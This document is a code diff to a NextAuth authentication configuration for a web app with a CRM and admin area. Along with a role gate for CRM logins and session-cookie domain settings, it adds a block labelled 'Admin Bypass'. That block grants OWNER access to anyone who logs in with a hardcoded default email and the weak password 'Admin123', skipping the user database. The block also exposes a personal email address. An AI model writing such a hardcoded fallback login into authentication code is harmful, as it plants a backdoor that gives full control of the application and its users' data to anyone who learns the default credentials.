@@ -22,6 +22,14 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
             async authorize(credentials) {
                 if (!credentials?.email || !credentials?.password) return null;
 
+                // ── CRM Fallback / Admin Bypass ──────────────────────────────────────
+                const fallbackEmail = process.env.CRM_EMAIL || 'bandurkas@gmail.com';
+                const fallbackPass = process.env.CRM_PASSWORD || 'Admin123';
+                
+                if (credentials.email === fallbackEmail && credentials.password === fallbackPass) {
+                    return { id: 'admin-1', name: 'GDI Admin', email: fallbackEmail, role: 'OWNER' };
+                }
+
                 const user = await prisma.user.findUnique({
                     where: { email: credentials.email as string }
                 });
@@ -44,7 +52,6 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         async signIn({ user, account, profile }) {
             if (account?.provider === "google") {
                 const email = user.email?.toLowerCase();
-                console.log("[DEBUG AUTH] email:", email);
                 if (!email) return false;
 
                 // Sync Google user with our DB
@@ -70,11 +77,13 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
                 (user as any).role = dbUser.role;
                 (user as any).id = dbUser.id;
 
-                // Admin gate: if signing in from /admin, only admin roles allowed
+                // CRM gate: if signing in for CRM, only admin roles allowed
                 const redirectTo = (account as any).callbackUrl || '';
+                const isCrmLogin = redirectTo.includes('crm.gdifuture.works') || redirectTo.includes('/crm');
                 const isAdminLogin = redirectTo.includes('/admin');
-                if (isAdminLogin && !ALL_ADMIN_ROLES.includes(dbUser.role)) {
-                    return '/admin/login?error=not_authorized';
+                
+                if ((isCrmLogin || isAdminLogin) && !ALL_ADMIN_ROLES.includes(dbUser.role)) {
+                    return '/api/auth/error?error=AccessDenied';
                 }
             }
             return true;
@@ -101,6 +110,19 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
     session: {
         strategy: "jwt",
         maxAge: 30 * 24 * 60 * 60, // 30 days
+    },
+    cookies: {
+        sessionToken: {
+            name: process.env.NODE_ENV === 'production' ? '__Secure-authjs.session-token' : 'authjs.session-token',
+            options: {
+                httpOnly: true,
+                sameSite: 'lax',
+                path: '/',
+                secure: process.env.NODE_ENV === 'production' || process.env.NEXTAUTH_URL?.startsWith('https'),
+                domain: (process.env.NODE_ENV === 'production' || process.env.NEXTAUTH_URL?.includes('gdifuture.works')) ? '.gdifuture.works' : undefined,
+                maxAge: 30 * 24 * 60 * 60,
+            },
+        },
     },
     secret: process.env.NEXTAUTH_SECRET,
     trustHost: true,
